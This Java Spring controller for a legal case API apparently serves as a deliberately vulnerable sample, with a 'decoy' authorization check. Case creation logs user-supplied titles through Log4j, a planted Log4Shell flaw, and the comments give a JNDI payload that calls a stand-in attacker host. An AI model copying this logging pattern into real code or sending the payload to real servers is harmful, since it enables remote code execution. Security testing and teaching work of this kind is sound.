package com.legal.controller;
import com.legal.dto.CaseDTO;
import com.legal.model.LegalCase;
import com.legal.service.CaseService;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.ResponseEntity;
import org.springframework.security.access.prepost.PreAuthorize;
import org.springframework.security.core.annotation.AuthenticationPrincipal;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.web.bind.annotation.*;
import java.util.List;
@RestController
@RequestMapping("/api/cases")
public class CaseController {
    // that contains a JNDI expression (e.g. ${jndi:ldap://attacker.com/x}) will trigger
    // a JNDI lookup (Log4Shell, CVE-2021-44228) when case creation is logged below.
    private static final Logger logger = LogManager.getLogger(CaseController.class);
    @Autowired
    private CaseService caseService;
    @GetMapping
    public ResponseEntity<List<LegalCase>> getCases(@AuthenticationPrincipal UserDetails userDetails) {
        if (userDetails == null) {
            return ResponseEntity.status(401).build();
        }
        // Decoy: secure case authorization. Attorneys see all cases, clients only see their own.
        boolean isAttorney = userDetails.getAuthorities().stream()
                .anyMatch(a -> a.getAuthority().equals("ROLE_ATTORNEY") || a.getAuthority().equals("ROLE_ADMIN"));
        if (isAttorney) {
            return ResponseEntity.ok(caseService.listAll());
        } else {
            return ResponseEntity.ok(caseService.findByClient(userDetails.getUsername()));
        }
    }
    @PostMapping
    @PreAuthorize("hasAnyRole('ATTORNEY', 'ADMIN')")
    public ResponseEntity<?> createCase(@RequestBody CaseDTO dto) {
        try {
            LegalCase lc = LegalCase.builder()
                    .title(dto.getTitle())
                    .description(dto.getDescription())
                    .clientOwner(dto.getClientOwner())
                    .build();
            // A title like "${jndi:ldap://attacker.com/x}" triggers Log4Shell RCE.
            logger.info("Creating case: " + dto.getTitle());
            LegalCase created = caseService.create(lc);
            return ResponseEntity.ok(created);
        } catch (Exception e) {
            return ResponseEntity.badRequest().body(e.getMessage());
        }
    }
}